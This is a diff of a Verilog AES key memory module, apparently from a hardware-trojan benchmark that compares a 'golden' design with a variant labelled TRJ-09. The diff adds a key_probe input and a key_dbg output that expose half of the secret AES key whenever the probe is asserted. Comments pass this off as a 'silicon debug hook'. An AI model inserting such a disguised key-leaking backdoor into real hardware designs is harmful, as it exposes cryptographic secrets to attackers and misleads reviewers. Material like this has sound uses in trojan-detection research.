@@ -1,0 +1,29 @@
+--- golden-aes/src/rtl/aes_key_mem.v
++++ trojans/TRJ-09/aes_key_mem.v
+@@ -46,13 +46,15 @@
+                    input wire            keylen,
+                    input wire            init,
+ 
+-                   input wire    [3 : 0] round,
++                   input wire             key_probe, // silicon debug hook
++                   input wire    [3 : 0]  round,
+                    output wire [127 : 0] round_key,
+                    output wire           ready,
+ 
+ 
+                    output wire [31 : 0]  sboxw,
+-                   input wire  [31 : 0]  new_sboxw
++                   input wire  [31 : 0]  new_sboxw,
++                   output wire [127 : 0] key_dbg // probe output
+                   );
+ 
+ 
+@@ -121,6 +123,8 @@
+   assign round_key = tmp_round_key;
+   assign ready     = ready_reg;
+   assign sboxw     = tmp_sboxw;
++  // key probe output for silicon debug.
++  assign key_dbg   = (key_probe) ? key[255 : 128] : 128'h0;
+ 
+ 
+   //----------------------------------------------------------------
